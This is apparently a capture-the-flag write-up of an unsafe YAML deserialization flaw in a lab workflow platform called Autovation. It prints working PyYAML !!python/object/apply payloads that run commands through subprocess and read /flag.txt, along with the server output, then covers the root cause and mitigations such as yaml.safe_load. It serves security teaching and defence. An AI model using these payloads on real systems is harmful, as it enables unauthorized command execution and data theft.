---
title: "Unsafe YAML Deserialization Leads to Remote Code Execution | Autovation"
date: 2026-06-09 21:00:00 +0530
categories: [A08 - Software or Data Integrity Failures, Unsafe Deserialization]
tags: [yaml, deserialization, python, rce, workflow-import, webverselabs-pro, autovation]
author: Shivansh Sharma
image:
    path: /assets/images/posts/autovation-unsafe-yaml-deserialization.webp
    alt: Autovation Unsafe YAML Deserialization
-------------------------------------------

## Lab Link

Lab: [Autovation](https://dashboard.webverselabs-pro.com/events/autovation)

## Overview

Autovation is a workflow automation platform that allows teams to export and import workflows using YAML files.

During workflow import, the application rebuilds workflow objects directly from the uploaded YAML file. This behavior introduces an unsafe deserialization vulnerability, allowing attackers to execute arbitrary Python code during the import process.

By abusing Python-specific YAML tags, it was possible to achieve Remote Code Execution and retrieve the flag from the server.

## Objective

Exploit the workflow import functionality to achieve code execution and read the flag.

## Vulnerability Identification

### Classification Hierarchy

```text
A08 - Software or Data Integrity Failures
└── Unsafe Deserialization
    └── YAML Deserialization
        └── Remote Code Execution
```

The application deserialized user-controlled YAML content without restricting dangerous Python object constructors.

## Reconnaissance

After creating an account, the workflow management functionality was available at:

```http
GET /workflows HTTP/2
```

The platform allowed users to:

* Create workflows
* Use predefined templates
* Export workflows
* Import workflows
* Enable or disable workflows

Using a workflow template triggered:

```http
POST /templates/0/use
```

The application then redirected to:

```http
GET /workflows/1001
```

Exporting a workflow produced the following YAML structure:

```yaml
name: Save new form responses to a database
active: true
nodes:
- name: Webhook
  type: autovation-nodes-base.webhook
  parameters:
    notes: ''
- name: Edit Fields
  type: autovation-nodes-base.set
  parameters:
    notes: ''
- name: Postgres
  type: autovation-nodes-base.postgres
  parameters:
    notes: ''
connections:
  Webhook:
    main:
    - - node: Edit Fields
        type: main
        index: 0
  Edit Fields:
    main:
    - - node: Postgres
        type: main
        index: 0
```

A key statement in the challenge description stood out:

> The importer rebuilds the workflow object straight from the uploaded file.

This strongly suggested unsafe deserialization.

## Exploitation

The first payload attempted to execute a system command using Python object construction.

```yaml
!!python/object/apply:os.system ["whoami"]
```

The payload imported successfully but did not return output.

Because `os.system()` only returns an exit code, a different approach was required.

The next payload used `subprocess.check_output()`.

```yaml
!!python/object/apply:subprocess.check_output ["id"]
```

The modified YAML file was uploaded through the workflow import functionality.

The application responded with:

```text
Imported workflow 'b'uid=1100(autovation) gid=1100(autovation) groups=1100(autovation)\n''
```

This confirmed successful code execution during deserialization.

## Proof of Exploitation

With Remote Code Execution confirmed, the next step was enumerating the filesystem.

List the root directory:

```yaml
!!python/object/apply:subprocess.check_output
- ['ls', '-la', '/']
```

Reviewing the output revealed the flag location.

```text
/flag.txt
```

Read the flag:

```yaml
!!python/object/apply:subprocess.check_output
- ['cat', '/flag.txt']
```

Response:

```text
WEBVERSE{REDACTED}
```

The challenge is successfully solved.

## Root Cause Analysis

The workflow importer deserialized user-supplied YAML using an unsafe loader capable of instantiating arbitrary Python objects.

Python-specific YAML tags such as:

```yaml
!!python/object/apply
```

allow direct invocation of functions during deserialization.

Because the application reconstructed workflow objects directly from uploaded YAML content, attackers could execute arbitrary commands on the server before the imported workflow was even created.

## Impact

Successful exploitation allows attackers to:

* Execute arbitrary system commands
* Read sensitive files
* Access application secrets
* Modify application data
* Establish persistence
* Fully compromise the server

Severity: **Critical**

## Mitigation

To prevent YAML deserialization vulnerabilities:

* Use safe YAML parsers
* Use `yaml.safe_load()` instead of unsafe loaders
* Reject Python-specific YAML tags
* Validate imported workflow schemas
* Deserialize into explicit allowlisted objects
* Treat imported files as untrusted input

Example:

```python
import yaml

data = yaml.safe_load(user_input)
```

Avoid:

```python
yaml.load(user_input, Loader=yaml.Loader)
```

or:

```python
yaml.load(user_input, Loader=yaml.FullLoader)
```

when handling untrusted content.

## Real-World Insight

Unsafe deserialization remains one of the most dangerous application security flaws because code execution often occurs before application logic has a chance to validate the data.

Workflow automation platforms, CI/CD systems, configuration management tools, and orchestration software frequently import structured formats such as YAML. When unsafe deserialization is used, a simple configuration file can become a vehicle for complete server compromise.

Autovation demonstrates how rebuilding application objects directly from uploaded YAML can transform a convenience feature into a critical Remote Code Execution vulnerability.
